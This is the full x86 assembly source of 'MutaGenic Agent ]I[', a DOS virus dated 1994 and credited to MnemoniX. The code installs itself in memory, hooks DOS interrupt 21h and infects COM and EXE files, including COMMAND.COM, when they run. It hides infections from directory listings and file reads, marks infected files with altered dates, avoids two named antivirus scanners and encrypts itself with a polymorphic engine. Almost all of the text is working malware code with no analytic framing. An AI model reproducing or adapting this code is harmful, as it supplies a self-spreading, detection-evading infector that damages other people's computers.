; ========================================================================>
;                            MutaGenic Agent ]I[
;                             by MnemoniX- 1994
;                      Resident COM/EXE infecting virus
;                            Infect on execution
;                    Won't infect ??SCAN.EXE or F-PROT.EXE
;                      Polymorphic, using MutaGen v2.0
;              Uses full stealth (disinfects in memory on open)
;                       A tricky virus, so BE CAREFUL.
;                   Usually nails COMMAND.COM on first run.
; ========================================================================>

MGEN_SIZE       equ     1938                    ; for MutaGen 2.0

code            segment byte    public  'code'
                org     0
                assume  cs:code,ds:code
                extrn   _mutagen:near

start:
                db      0E9h,02,00,4Dh,47h
virus_begin:
                push    ds es

                call    $+3
                pop     bp
                sub     bp,offset $-1

                mov     ax,577Eh                ; residency test
                int     21h
                cmp     ax,0A881h
                je      installed

                mov     ax,ds
                dec     ax
                mov     ds,ax

                sub     word ptr ds:[3],((MEM_SIZE+1023) / 1024) * 64
                sub     word ptr ds:[12h],((MEM_SIZE+1023) / 1024) * 64
                mov     es,word ptr ds:[12h]

                push    cs                      ; copy virus into memory
                pop     ds
                xor     di,di
                mov     si,bp
                mov     cx,(virus_end - start) / 2 + 1
                rep     movsw

                xor     ax,ax                   ; capture interrupt 21
                mov     ds,ax

                mov     si,21h * 4
                mov     di,offset old_int_21
                movsw
                movsw

                mov     word ptr [si - 4],offset new_int_21
                mov     [si - 2],es
installed:
                pop     es ds

                cmp     sp,'GM'                 ; EXE?
                je      exe_exit

                mov     di,100h
                push    di
                lea     si,[bp + read_buffer]
                movsw
                movsw
                movsb
                call    fix_regs

                ret

exe_exit:
                mov     ax,ds
                add     ax,10h
                add     cs:[bp + exe_cs],ax
                add     ax,cs:[bp + exe_ss]
                cli
                mov     ss,ax
                mov     sp,cs:[bp + exe_sp]
                sti
                call    fix_regs
                db      0EAh
exe_ip          dw      0
exe_cs          dw      0

exe_ss          dw      0
exe_sp          dw      0

fix_regs:
                xor     ax,ax
                xor     bx,bx
                cwd
                xor     di,di
                mov     si,100h
                xor     bp,bp
                ret

int_21:
                pushf
                call    dword ptr cs:[old_int_21]
                ret

new_int_21:
                cmp     ax,577Eh
                je      pass
                cmp     ah,11h
                je      dir_stealth_1
                cmp     ah,12h
                je      dir_stealth_1
                cmp     ah,4Eh
                je      dir_stealth_2
                cmp     ah,4Fh
                je      dir_stealth_2
                cmp     ah,3Dh
                jne     next_1
                jmp     file_open
next_1:
                cmp     ah,6Ch
                jne     next_2
                jmp     file_open
next_2:
                cmp     ax,4B00h
                jne     next_3
                jmp     execute
next_3:
                cmp     ah,3Fh
                jne     next_4
                jmp     file_read
next_4:
                cmp     ax,5700h
                jne     next_5
                jmp     fix_date
next_5:
int_21_exit:
                db      0EAh
old_int_21      dd      0

pass:
                not     ax
                iret

dir_stealth_1:
                call    int_21                  ; do it
                test    al,al                   ; if al = -1
                js      cant_find               ; then don't bother

                push    ax bx es                ; check file for infection

                mov     ah,2Fh
                int     21h

                cmp     byte ptr es:[bx],-1     ; check for extended FCB
                jne     no_ext_FCB
                add     bx,7

no_ext_FCB:
                mov     ax,es:[bx + 19h]
                cmp     ah,100                  ; check years -  
                jb      fixed                   ; if 100+, infected

                ror     ah,1
                sub     ah,100
                rol     ah,1
                mov     es:[bx + 19h],ax

                sub     word ptr es:[bx + 1Dh],VIRUS_SIZE + 328
                sbb     word ptr es:[bx + 1Fh],0
fixed:
                pop     es bx ax
cant_find:               
                iret

dir_stealth_2:
                call    int_21                  ; perform file search
                jnc     check_file_2            ; if found, proceed
                retf    2                       ; nope, leave
check_file_2:
                push    ax bx si es

                mov     ah,2Fh                  ; find DTA
                int     21h

                mov     ax,es:[bx + 18h]
                cmp     ah,100                  ; check for infection marker
                jb      fixed_2

                ror     ah,1                    ; fix up date
                sub     ah,100
                rol     ah,1
                mov     es:[bx + 18h],ax

                sub     word ptr es:[bx + 1Ah],VIRUS_SIZE + 328
                sbb     word ptr es:[bx + 1Ch],0
fixed_2:
                pop     es si bx ax             ; done
                clc
                retf    2

file_open:
                call    int_21                  ; open file
                jc      open_fail               ; carry set, open failed
                         
                cmp     ax,5                    ; if handle is a device,
                jb      dont_bother             ; don't bother with it

                push    ax bx di es

                xchg    ax,bx

                push    bx
                mov     ax,1220h                ; get system file table
                int     2Fh                     ; entry

                nop                             ; anti-SCAN

                mov     bl,es:[di]
                mov     ax,1216h
                int     2Fh
                pop     bx

                mov     ax,es:[di + 0Fh]        ; check time stamp
                cmp     ah,100
                jb      dont_stealth
                
                cmp     word ptr es:[di],1      ; if file has already
                ja      dont_stealth            ; been opened, don't stealth

                sub     es:[di + 11h],VIRUS_SIZE + 328
                sbb     word ptr es:[di + 13h],0 ; stealth it ... change file
                                                ; size

dont_stealth:
                pop     es di bx ax             ; restore everything
dont_bother:
                clc
open_fail:
                retf    2                       ; and return

file_read:
                cmp     bx,5                    ; if read from device,
                jae     check_it_out            ; don't bother
                jmp     forget_it

check_it_out:
                push    si di es ax bx cx
                
                push    bx
                mov     ax,1220h
                int     2Fh

                mov     ax,1216h
                mov     bl,es:[di]
                int     2Fh
                pop     bx

                mov     ax,es:[di + 0Fh]        ; 100+ years
                cmp     ah,100
                jae     check_pointer           ; is the magic number
                jmp     no_read_stealth
check_pointer:
                cmp     word ptr es:[di + 17h],0 ; if file pointer above 64K,
                je      check_pointer_2         ; then skip it
                jmp     no_read_stealth

check_pointer_2:
                cmp     word ptr es:[di + 15h],28 ; if file pointer under 28,
                jae     no_read_stealth         ; then DON'T

                push    es:[di + 15h]           ; save it
                
                mov     ah,3Fh
                call    int_21                  ; do the read function
                
                pop     cx                      ; now find how many bytes
                push    ax                      ; (Save AX value)
                sub     cx,28                   ; we have to change ...
                neg     cx                      ; and where

                cmp     ax,cx                   ; if more than 28 were read,
                jae     ok                      ; ok

                xchg    ax,cx                   ; otherwise, switch around
ok:
                push    ds cx dx

                push    es:[di + 15h]           ; save current file pointer
                push    es:[di + 17h]

                add     es:[di + 11h],VIRUS_SIZE + 328
                adc     word ptr es:[di + 13h],0
                mov     ax,es:[di + 11h]        ; fix up file size to prevent
                sub     ax,28                   ; read past end of file

                mov     es:[di + 15h],ax
                mov     ax,es:[di + 13h]
                mov     es:[di + 17h],ax

                push    cs                      ; now read in real first 28
                pop     ds                      ; bytes
                mov     dx,offset read_buffer
                mov     cx,28
                mov     ah,3Fh
                call    int_21

                sub     es:[di + 11h],VIRUS_SIZE + 328
                sbb     word ptr es:[di + 13h],0

                pop     es:[di + 17h]           ; restore file pointer
                pop     es:[di + 15h]

                pop     dx cx ds                ; now we move our 28 bytes
                push    ds                      ; into theirs ...
                pop     es

                mov     di,dx
                mov     si,offset read_buffer
                push    cs
                pop     ds
                rep     movsb                   ; done

                push    es                      ; restore DS
                pop     ds

                pop     ax
                pop     cx bx es es di si
                clc
                retf    2

no_read_stealth:
                pop     cx bx ax es di si
forget_it:
                jmp     int_21_exit

fix_date:
                call    int_21                  ; get date
                jc      an_error
                cmp     dh,100                  ; if years > 100,
                jb      date_fixed              ; fix it up
                ror     dh,1
                sub     dh,100
                rol     dh,1
date_fixed:
                iret
an_error:
                retf    2

execute:
                push    ax si
                mov     si,dx
find_ext:
                lodsb
                test    al,al
                je      not_av
                cmp     al,'.'
                jne     find_ext

                cmp     ds:[si],'XE'            ; check for ??SCAN.EXE
                jne     not_av
                cmp     ds:[si - 3],'NA'
                jne     f_prot
                cmp     ds:[si - 5],'CS'
                je      av_prog
f_prot:
                cmp     ds:[si - 3],'TO'        ; check for F-PROT.EXE
                jne     not_av
                cmp     ds:[si - 5],'RP'
                jne     not_av
av_prog:
                pop     si ax
                jmp     int_21_exit
not_av:
                pop     si ax
                push    ax bx cx dx si di ds es
                mov     ax,3D00h
                call    int_21
                jnc     opened
                jmp     cant_open
opened:
                xchg    bx,ax

                push    bx
                mov     ax,1220h
                int     2Fh
                mov     ax,1216h
                mov     bl,es:[di]
                int     2Fh
                pop     bx

                mov     word ptr es:[di + 2],2

                push    cs
                pop     ds

                mov     ah,3Fh
                mov     dx,offset read_buffer
                mov     cx,28
                call    int_21

                cmp     read_buffer,'ZM'
                jne     infect_com
                jmp     infect_exe

infect_com:
                cmp     read_buffer[3],'GM'
                je      dont_infect

                mov     ax,es:[di + 11h]
                mov     es:[di + 15h],ax
                sub     ax,3
                mov     word ptr new_jump[1],ax

                add     ax,103h
                xchg    dx,ax
                call    write_it
                
                mov     cx,5
                mov     dx,offset new_jump
                mov     ah,40h
                call    int_21
stamp_n_close:                
                mov     cx,es:[di + 0Dh]
                mov     dx,es:[di + 0Fh]
                ror     dh,1
                add     dh,100
                rol     dh,1
                mov     ax,5701h
                call    int_21
dont_infect:
                mov     ah,3Eh
                call    int_21
cant_open:
                pop     es ds di si dx cx bx ax
                jmp     int_21_exit

infect_exe:
                cmp     word ptr read_buffer[26],0
                ja      dont_infect             ; don't infect overlay .EXE

                cmp     word ptr read_buffer[16],'GM'
                je      dont_infect             ; infected already

                push    es di

                push    cs                      ; save this header
                pop     es

                mov     si,offset read_buffer
                mov     di,offset orig_header
                mov     cx,14
                rep     movsw

                pop     di es

                mov     ax,word ptr orig_header[20]
                mov     exe_ip,ax
                mov     ax,word ptr orig_header[22]
                mov     exe_cs,ax
                mov     ax,word ptr orig_header[14]
                mov     exe_ss,ax
                mov     ax,word ptr orig_header[16]
                mov     exe_sp,ax

                mov     ax,es:[di + 11h]        ; file size        
                mov     dx,es:[di + 13h]

                push    ax dx                   ; (save these for later)

                push    bx
                mov     cl,12
                shl     dx,cl
                mov     bx,ax
                mov     cl,4
                shr     bx,cl
                add     dx,bx
                and     ax,15
                pop     bx

                sub     dx,word ptr orig_header[8]
                mov     word ptr orig_header[22],dx
                mov     word ptr orig_header[20],ax

                add     dx,80h          ; give stack some space
                mov     word ptr orig_header[14],dx
                mov     word ptr orig_header[16],'GM'
                
                pop     dx ax
                add     ax,VIRUS_SIZE + 28
                adc     dx,0

                mov     cx,512                  ; in pages
                div     cx                      ; then save results
                inc     ax
                mov     word ptr orig_header[2],dx
                mov     word ptr orig_header[4],ax

                mov     ax,4202h                ; to EOF
                cwd
                xor     cx,cx
                call    int_21

                mov     dx,word ptr orig_header[20]
                call    write_it

                mov     cx,28
                mov     dx,offset orig_header
                mov     ah,40h
                call    int_21

                jmp     stamp_n_close

write_it:
                push    dx
                mov     ax,2524h                ; trap int 24
                mov     dx,offset int_24
                call    int_21
                pop     dx

                push    es di                   ; call MutaGen
                push    cs
                pop     es
                mov     cx,VIRUS_SIZE
                mov     di,offset encrypt_buffer
                mov     si,offset virus_begin
                call    _mutagen
                pop     di es

                mov     si,cx
                mov     ah,40h
                call    int_21

                sub     si,VIRUS_SIZE + 300
                neg     si
                mov     cx,si
                mov     ah,40h
                mov     dx,offset encrypt_buffer + 200
                call    int_21

                mov     cx,28                   ; for stealth
                mov     dx,offset read_buffer
                mov     ah,40h
                call    int_21

                mov     word ptr es:[di + 15h],0
                mov     word ptr es:[di + 17h],0
                ret

                db      'MutaGenic Agent ]I[',0

int_24:                                 ; int 24 handler
                mov     al,3
                iret

new_jump        db      0E9h,00,00,4Dh,47h
pop_buffer      dw      0
read_buffer     dw      14 dup (20CDh)

virus_end       equ     $ + MGEN_SIZE
VIRUS_SIZE      equ     virus_end - virus_begin

orig_header     equ     virus_end
encrypt_buffer  equ     virus_end + 28
end_heap        equ     virus_end + 28 + VIRUS_SIZE + 300

MEM_SIZE        equ     end_heap - start

code            ends
                end     start
